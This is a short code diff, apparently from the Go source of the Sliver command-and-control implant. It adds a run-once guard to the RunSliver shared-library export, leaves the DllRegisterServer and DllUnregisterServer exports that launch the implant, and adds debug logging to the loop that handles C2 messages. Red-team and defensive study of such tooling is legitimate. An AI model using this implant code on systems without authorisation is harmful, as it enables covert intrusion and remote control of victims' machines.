@@ -47,10 +47,15 @@ import (
 
 // {{if .IsSharedLib}}
 
+var isRunning bool = false
+
 // RunSliver - Export for shared lib build
 //export RunSliver
 func RunSliver() {
-	main()
+	if !isRunning {
+		isRunning = true
+		main()
+	}
 }
 
 // Thanks Ne0nd0g for those
@@ -74,7 +79,6 @@ func DllRegisterServer() { main() }
 // https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
 //export DllUnregisterServer
 func DllUnregisterServer() { main() }
-
 
 // {{end}}
 
@@ -116,6 +120,9 @@ func mainLoop(connection *transports.Connection) {
 
 	for envelope := range connection.Recv {
 		if handler, ok := specialHandlers[envelope.Type]; ok {
+			// {{if .Debug}}
+			log.Printf("[recv] specialHandler %d", envelope.Type)
+			// {{end}}
 			handler(envelope.Data, connection)
 		} else if handler, ok := sysHandlers[envelope.Type]; ok {
 			// {{if .Debug}}
